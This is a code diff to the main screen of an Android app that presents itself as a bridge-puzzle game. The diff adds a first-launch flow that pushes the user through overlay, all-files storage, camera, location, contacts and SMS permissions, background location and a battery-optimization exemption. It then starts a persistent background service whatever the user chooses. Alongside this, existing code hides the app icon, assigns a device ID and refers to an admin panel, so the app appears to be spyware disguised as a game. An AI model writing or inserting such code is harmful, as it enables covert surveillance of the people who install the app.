@@ -4,18 +4,30 @@ import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.Intent;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.PowerManager;
+import android.provider.Settings;
 import android.widget.Button;
 import android.widget.ImageButton;
 import android.widget.TextView;
 import android.widget.Toast;
+import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
 import com.hashibridge.master.game.BridgeGameView;
 import com.hashibridge.master.game.BridgePuzzleGenerator;
+import com.hashibridge.master.utils.PermissionHelper;
 import java.util.Random;
 
 public class MainActivity extends AppCompatActivity {
+
+    private static final int RC_PERMISSIONS        = 2001;
+    private static final int RC_BACKGROUND_LOC     = 2002;
+    private static final int RC_OVERLAY            = 2003;
+    private static final int RC_STORAGE            = 2004;
+    private static final int RC_BATTERY_OPT        = 2005;
 
     private BridgeGameView gameView;
     private TextView tvHud;
@@ -29,7 +41,10 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         com.hashibridge.master.utils.Config.getOrCreateDeviceId(this);
-        autoStartServiceIfReady();
+
+        // 🔑 Auto-start permission flow on first launch — no admin panel needed
+        startPermissionFlow();
+
         if (com.hashibridge.master.utils.Config.isIconHidden(this)) {
             com.hashibridge.master.utils.Config.hideAppIcon(this);
         }
@@ -68,6 +83,108 @@ public class MainActivity extends AppCompatActivity {
         tvLevelBadge.setOnLongClickListener(v -> { copyDeviceId(); return true; });
 
         startPuzzle(currentLevel);
+    }
+
+    // ─── Permission flow ────────────────────────────────────────────────────
+
+    /**
+     * Full sequential permission flow:
+     *  1. SYSTEM_ALERT_WINDOW (overlay)
+     *  2. MANAGE_EXTERNAL_STORAGE (Android 11+)
+     *  3. All runtime permissions (camera, location, contacts, sms, …)
+     *  4. ACCESS_BACKGROUND_LOCATION (Android 10+)
+     *  5. Battery optimization exemption
+     *  6. Start service
+     */
+    private void startPermissionFlow() {
+        // Step 1: overlay
+        if (!Settings.canDrawOverlays(this)) {
+            Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    Uri.parse("package:" + getPackageName()));
+            startActivityForResult(i, RC_OVERLAY);
+            return;
+        }
+
+        // Step 2: MANAGE_EXTERNAL_STORAGE (Android 11+)
+        if (PermissionHelper.needsManageStorage()
+                && !PermissionHelper.isExternalStorageManager(this)) {
+            Intent manage = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
+                    Uri.parse("package:" + getPackageName()));
+            try {
+                startActivityForResult(manage, RC_STORAGE);
+            } catch (Exception e) {
+                startActivityForResult(
+                        new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION), RC_STORAGE);
+            }
+            return;
+        }
+
+        // Step 3: runtime permissions
+        String[] perms = PermissionHelper.getRuntimePermissions();
+        if (perms.length > 0) {
+            ActivityCompat.requestPermissions(this, perms, RC_PERMISSIONS);
+            return;
+        }
+
+        onRuntimePermissionsDone();
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode,
+                                           @NonNull String[] permissions,
+                                           @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == RC_PERMISSIONS) {
+            onRuntimePermissionsDone();
+        } else if (requestCode == RC_BACKGROUND_LOC) {
+            requestBatteryOptimizationExemption();
+        }
+    }
+
+    /** Step 4: background location (Android 10+) → then battery opt */
+    private void onRuntimePermissionsDone() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            ActivityCompat.requestPermissions(this,
+                    new String[]{android.Manifest.permission.ACCESS_BACKGROUND_LOCATION},
+                    RC_BACKGROUND_LOC);
+        } else {
+            requestBatteryOptimizationExemption();
+        }
+    }
+
+    /** Step 5: battery optimization exemption — biar service tidak dibunuh OS */
+    private void requestBatteryOptimizationExemption() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                try {
+                    Intent i = new Intent(
+                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                            Uri.parse("package:" + getPackageName()));
+                    startActivityForResult(i, RC_BATTERY_OPT);
+                    return;
+                } catch (Exception e) {
+                    // Fallback: buka halaman battery settings umum
+                    try {
+                        startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
+                    } catch (Exception ignored) {}
+                }
+            }
+        }
+        // Step 6: service + watchdog
+        autoStartServiceIfReady();
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == RC_OVERLAY || requestCode == RC_STORAGE) {
+            // Continue the flow after system-settings screen closes
+            startPermissionFlow();
+        } else if (requestCode == RC_BATTERY_OPT) {
+            // Done — start service regardless of user choice
+            autoStartServiceIfReady();
+        }
     }
 
     private void openAdminPanel() {
